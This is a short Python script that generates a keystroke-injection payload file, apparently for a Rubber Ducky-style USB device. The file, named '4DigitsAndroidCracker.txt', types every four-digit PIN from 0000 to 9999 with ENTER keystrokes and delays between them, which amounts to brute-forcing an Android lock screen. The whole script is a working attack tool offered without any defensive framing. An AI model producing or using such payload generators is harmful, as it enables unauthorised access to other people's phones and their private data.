import desktop_file

desktop_path = desktop_file.getDesktopPath()
counter = 0
delay_time = 500 #set delay time in milliseconds

f = open(desktop_path + "/4DigitsAndroidCracker.txt", "w")
while counter < 10000:
    digits = str(counter).zfill(4)
    f.write("ENTER\n")
    f.write("ENTER\n")
    f.write("DELAY " + str(delay_time) + "\n")
    f.write("STRING " + (str(digits)) + "\n")
    counter = counter +1
    print(counter)
f.write("ENTER\n")
f.write("ENTER\n")
print("done!")
f.close()